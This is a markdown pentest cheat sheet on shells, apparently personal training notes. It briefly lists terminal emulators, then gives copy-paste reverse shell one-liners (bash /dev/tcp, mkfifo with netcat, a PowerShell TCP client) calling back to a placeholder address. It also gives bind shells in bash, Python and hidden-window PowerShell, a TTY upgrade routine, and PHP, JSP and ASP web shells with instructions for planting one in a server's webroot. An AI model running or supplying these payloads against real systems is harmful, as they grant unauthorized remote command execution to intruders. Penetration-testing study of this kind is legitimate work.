## Anatomy of shell

*Every operating system has a shell, and to interact with it, we must use an application known as a terminal emulator.When we discuss command-line interfaces, we know it is a combination of the operating system, terminal emulator application, and the command language interpreter.  Here are some of the most common terminal emulators:*
| **Terminal Emulator**                                          | **Operating System**     |
| -------------------------------------------------------------- | ------------------------ |
| [Windows Terminal](https://github.com/microsoft/terminal)      | Windows                  |
| [cmder](https://cmder.app)                                     | Windows                  |
| [PuTTY](https://www.putty.org)                                 | Windows                  |
| [kitty](https://sw.kovidgoyal.net/kitty/)                      | Windows, Linux and MacOS |
| [Alacritty](https://github.com/alacritty/alacritty)            | Windows, Linux and MacOS |
| [xterm](https://invisible-island.net/xterm/)                   | Linux                    |
| [GNOME Terminal](https://en.wikipedia.org/wiki/GNOME_Terminal) | Linux                    |
| [MATE Terminal](https://github.com/mate-desktop/mate-terminal) | Linux                    |
| [Konsole](https://konsole.kde.org)                             | Linux                    |
| [Terminal](https://en.wikipedia.org/wiki/Terminal_(macOS))     | MacOS                    |
| [iTerm2](https://iterm2.com)                                   | MacOS                    |

```
sasa@example$ ps ; env
```
[Command and Scripting Interpreter ](https://attack.mitre.org/techniques/T1059/)

## REVERSE Shell 
#### The remote machine initiates the connection and sends a request to connect to the target machine

*nc -lvnp 1234
-l 	Listen mode, to wait for a connection to connect to us.
-v 	Verbose mode, so that we know when we receive a connection.
-n 	Disable DNS resolution and only connect from/to IPs, to speed up the connection.*

##### Bash:
```
bash -c 'bash -i >& /dev/tcp/10.10.10.10/1234 0>&1'
```
```
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.10.10 1234 >/tmp/f
```
##### Powershell:
```
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.10.10',1234);$s = $client.GetStream();[byte[]]$b = 0..65535|%{0};while(($i = $s.Read($b, 0, $b.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0, $i);$sb = (iex $data 2>&1 | Out-String );$sb2 = $sb + 'PS ' + (pwd).Path + '> ';$sbt = ([text.encoding]::ASCII).GetBytes($sb2);$s.Write($sbt,0,$sbt.Length);$s.Flush()};$client.Close()"
```

---

## BIND Shell 
#### the target/victim machine listens for incoming connections and provides a shell interface when a connection is established
##### Bash:
```
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc -lvp 1234 >/tmp/f
```
```
rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc -l 10.129.41.200 7777 > /tmp/f  ; client: nc -nv 10.129.41.200 7777
```

##### Python:
```
python -c 'exec("""import socket as s,subprocess as sp;s1=s.socket(s.AF_INET,s.SOCK_STREAM);s1.setsockopt(s.SOL_SOCKET,s.SO_REUSEADDR, 1);s1.bind(("0.0.0.0",1234));s1.listen(1);c,a=s1.accept();\nwhile True: d=c.recv(1024).decode();p=sp.Popen(d,shell=True,stdout=sp.PIPE,stderr=sp.PIPE,stdin=sp.PIPE);c.sendall(p.stdout.read()+p.stderr.read())""")'
```
##### Powershell:
```
powershell -NoP -NonI -W Hidden -Exec Bypass -Command $listener = [System.Net.Sockets.TcpListener]1234; $listener.start();$client = $listener.AcceptTcpClient();$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + " ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close();
```
1. Once we execute the bind shell command, we should have a shell waiting for us on the specified port. We can now connect to it.
2. nc 10.10.10.1 1234

##### Upgrading TTY:
1. python -c 'import pty; pty.spawn("/bin/bash")'
2. After we run this command, we will hit ctrl+z to background our shell and get back on our local terminal
```
www-data@remotehost$ ^Z

stty raw -echo
fg
[Enter]
www-data@remotehost$
```

*We may notice that our shell does not cover the entire terminal. To fix this, we need to figure out a few variables. We can open another terminal window on our system, maximize the windows or use any size we want, and then input the following commands to get our variables:*
```
sasa7@htb[/user]$ echo $TERM
xterm-256color

sasa7@htb[/user]$ stty size
67 318
```
---

## Web Shell

##### Code: php
```
<?php system($_REQUEST["cmd"]); ?>
``` 
```
echo '<?php system($_REQUEST["cmd"]); ?>' > /var/www/html/shell.php AND THEN IN BROWSER: http://SERVER_IP:PORT/shell.php?cmd=id
```
##### Code: jsp
```
 <% Runtime.getRuntime().exec(request.getParameter("cmd")); %>
```   
##### Code: asp
```
<% eval request("cmd") %>
```

```
The following are the default webroots for common web servers:
Apache 	/var/www/html/
Nginx 	/usr/local/nginx/html/
IIS 	c:\inetpub\wwwroot\
XAMPP 	C:\xampp\htdocs\
```
